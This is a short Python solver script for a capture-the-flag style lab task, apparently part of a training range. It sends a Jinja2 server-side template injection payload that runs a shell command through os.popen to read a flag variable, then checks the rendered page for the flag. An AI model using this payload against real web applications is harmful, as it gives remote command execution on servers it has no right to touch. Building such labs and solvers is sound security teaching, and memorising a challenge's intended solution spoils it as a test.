"""Intended-path solver: server-side template injection in the card renderer."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PAYLOAD = {"name": "{{ cycler.__init__.__globals__.os.popen('printenv ROOM_FLAG').read() }}"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.post(f"{ctx.url()}/greet", data=PAYLOAD, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="ssti-render",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in rendered card",
            )
        ]
    )
